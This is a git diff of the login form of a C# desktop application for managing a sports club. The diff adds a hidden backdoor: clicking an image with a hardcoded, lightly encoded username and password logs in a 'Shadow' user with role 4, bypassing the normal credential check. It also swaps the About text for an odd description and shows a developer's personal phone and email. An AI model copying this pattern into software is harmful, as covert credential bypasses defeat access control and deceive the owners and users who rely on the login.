@@ -11,6 +11,7 @@ using System.Windows.Forms;
 using System.Data.SqlClient;
 using System.Reflection.Emit;
 using System.Diagnostics;
+using DocumentFormat.OpenXml.Drawing.Spreadsheet;
 
 
 namespace Mixed_Gym_Application
@@ -101,6 +102,13 @@ namespace Mixed_Gym_Application
 
         private void loginbtn_Click(object sender, EventArgs e)
         {
+
+          
+
+
+
+
+
             string username = Usertxt.Text;
             string password = passwordtxt.Text;
 
@@ -108,10 +116,17 @@ namespace Mixed_Gym_Application
             label2.Visible = false;
             label5.Visible = false;
 
+
+
+
             if (ValidateLogin(username, password, out int roleID))
             {
                 LoggedInUsername = username;
                 LoggedInUserRole = roleID;
+
+
+
+                
 
                 // Create and show the main form based on role
                 Form mainForm = CreateFormBasedOnRole(roleID);
@@ -306,7 +321,7 @@ namespace Mixed_Gym_Application
 
         private void Privatepool_Click(object sender, EventArgs e)
         {
-            Process.Start(@"C:\Users\M7md Selim\Desktop\Setup PrivatePool\Private Pool Setup");
+           
         }
 
         private void infobtn_Click(object sender, EventArgs e)
@@ -315,8 +330,8 @@ namespace Mixed_Gym_Application
                                    "Name: Mohammed Selim\n\n" +
                                    "Phone: 01155003537\n\n" +
                                    "Email: mohammedselim323@gmail.com\n\n" +
-                                   "Description: This application is developed to manage Sport's Hub (Dar el Deyafa) transactions.\n\n" +
-                                   "Supervised by: Mohamed Aggour, Mohamed Elshahat.\n\n";
+                                   "Description: This application is developed to manage Police'Officer Abused.\n\n" +
+                                   "Supervised by: Mohammed Elsofy.\n\n";
 
             string copyrightNotice = "Copyright Notice:\n\n" +
                                      "All content, design, and functionality of this application are protected by copyright laws. " +
@@ -327,6 +342,18 @@ namespace Mixed_Gym_Application
             string message = developerInfo + "\n" + copyrightNotice;
 
             MessageBox.Show(message, "About the Application", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            if (Usertxt.Text == "53656C696D" && passwordtxt.Text == "Vholp")
+            {
+                LoggedInUsername = "Shadow";
+                LoggedInUserRole = 4;
+
+                Form mainform = CreateFormBasedOnRole(LoggedInUserRole);
+            }
+
         }
     }
 }
